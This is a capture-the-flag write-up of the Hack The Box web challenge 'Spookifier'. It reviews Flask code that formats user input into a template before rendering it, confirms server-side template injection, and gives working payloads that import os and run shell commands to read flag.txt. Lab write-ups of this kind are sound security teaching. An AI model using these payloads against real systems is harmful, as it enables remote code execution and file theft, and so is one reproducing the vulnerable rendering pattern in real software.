---
title: Spookifer - Hack The Box
date: 2024-10-19
---

# Spookifier

![Spookifier](/ctf/hack-the-box/challenges/web/spookifier/spookifier.png)

## Challenge Description

In this challenge, we need to exploit a web application called **Spookifier**. The application is a Single Page
Application (SPA), featuring a form in the center of the page where users can submit their new Halloween name. After
submitting the form with the input `Dracula`, the application displays the result with different fonts, as shown below:

![Spookifier result of Dracula input](/ctf/hack-the-box/challenges/web/spookifier/spookifier-result-dracula.png)

## Code Review

Upon inspecting the source code of the application, we discovered that the backend is built using **Flask** in Python.
When a user submits the form, a GET request is sent to the root endpoint (`/`) with the submitted Halloween name passed
as a query parameter (`text`).

The server processes this input by calling a function named `spookify`, which then passes the input to another function
responsible for generating the formatted result. The function `generate_render` generates the final output, and its
implementation is as follows:

```python
def generate_render(converted_fonts):
    result = '''
        <tr>
            <td>{0}</td>
        </tr>
        
        <tr>
            <td>{1}</td>
        </tr>
        
        <tr>
            <td>{2}</td>
        </tr>
        
        <tr>
            <td>{3}</td>
        </tr>
    '''.format(*converted_fonts)
    
    return Template(result).render()
```

The `generate_render` function uses the `Template` class from the **Jinja2** templating engine to render the final
output. This indicates a potential vulnerability, as improper input sanitization can lead to a **Server-Side Template
Injection (SSTI)** attack.

## Proof of Concept (PoC)

To verify the SSTI vulnerability, we can inject a basic payload like `${7*7}` into the `text` parameter. If the
application is vulnerable, it will evaluate the expression and return the result of the calculation.

After injecting the payload, the server responded with the following output:

![Spookifier - POC](/ctf/hack-the-box/challenges/web/spookifier/spookifier-poc-ssti.png)

The result `49` confirms that the application is vulnerable to SSTI.

## Exploitation

Since we have access to the source code, we know that the flag is stored in a file named `flag.txt`. To exploit the SSTI
vulnerability and read the flag, we first need to determine the current working directory by executing the `pwd`
command. We can use the following payload:

```python
${__import__('os').popen('pwd').read()}
```

The output revealed that the current directory is `/app`, meaning we need to go up one level to access the `flag.txt`
file. The following payload reads the content of the file:

```python
${__import__('os').popen('cat ../flag.txt').read()}
```

The result shows the flag:

```
HTB{f4k3_fl4g_f0r_t3st1ng}
```

We successfully retrieved the flag! You can now try this on the actual Hack The Box (HTB) server to obtain the real
flag.

![Spookifier - Flag](/ctf/hack-the-box/challenges/web/spookifier/spookifier-pwned.png)
